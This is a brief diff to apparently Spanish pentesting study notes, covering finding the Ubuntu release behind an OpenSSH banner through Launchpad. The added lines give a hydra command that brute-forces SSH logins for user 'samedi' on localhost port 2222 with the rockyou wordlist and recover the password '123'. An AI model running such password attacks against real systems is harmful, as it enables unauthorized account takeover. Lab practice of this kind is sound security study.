@@ -16,3 +16,10 @@ Por ejemplo, si la versión del servidor SSH es “OpenSSH 8.2p1 Ubuntu 4ubuntu0
 Todas estas búsquedas las aplicamos sobre el siguiente dominio:
 
 - Launchpad: https://launchpad.net/ubuntu
+
+
+---
+
+hydra -l samedi -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1 -s 2222 -t 15
+- Esto realiza un ataque de fuerza bruta al SSH del User samedi al host 127.0.0.1
+- Entrega la passwd del usuario, como caso de ejemplo utilizaremos 123
